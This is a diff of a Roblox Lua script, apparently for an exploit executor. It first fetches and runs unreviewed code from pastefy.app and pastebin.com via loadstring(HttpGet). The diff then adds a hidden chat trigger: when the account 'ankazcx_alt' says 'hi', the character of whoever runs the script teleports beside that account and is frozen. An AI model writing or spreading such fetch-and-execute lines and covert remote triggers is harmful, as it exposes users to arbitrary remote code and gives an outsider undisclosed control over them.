@@ -1,41 +1,31 @@
 loadstring(game:HttpGet('https://pastefy.app/4bSte7fF/raw'))()
 loadstring(game:HttpGet('https://pastebin.com/raw/Vg6AZbZE'))()
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local localPlayer = Players.LocalPlayer
 
-local function startDistanceCheck(targetPlayer)
-    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-    local rootPart = character:WaitForChild("HumanoidRootPart")
+local function onPlayerAdded(player)
+    player.Chatted:Connect(function(message)
+        if player.Name == "ankazcx_alt" and message:lower() == "hi" then
+            local myChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+            local myRoot = myChar:WaitForChild("HumanoidRootPart")
 
-    local function check()
-        local targetCharacter = targetPlayer.Character
-        if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
-            local distance = (rootPart.Position - targetCharacter.HumanoidRootPart.Position).Magnitude
-            if distance <= 10 then
-                rootPart.Anchored = true
-                return true
+            local targetChar = player.Character
+            if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+                myRoot.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
+                myRoot.Anchored = true
             end
-        end
-        return false
-    end
-
-    local connection
-    connection = RunService.Heartbeat:Connect(function()
-        if check() then
-            connection:Disconnect()
         end
     end)
 end
 
 for _, player in pairs(Players:GetPlayers()) do
     if player.Name == "ankazcx_alt" then
-        startDistanceCheck(player)
+        onPlayerAdded(player)
     end
 end
 
 Players.PlayerAdded:Connect(function(player)
     if player.Name == "ankazcx_alt" then
-        startDistanceCheck(player)
+        onPlayerAdded(player)
     end
 end)
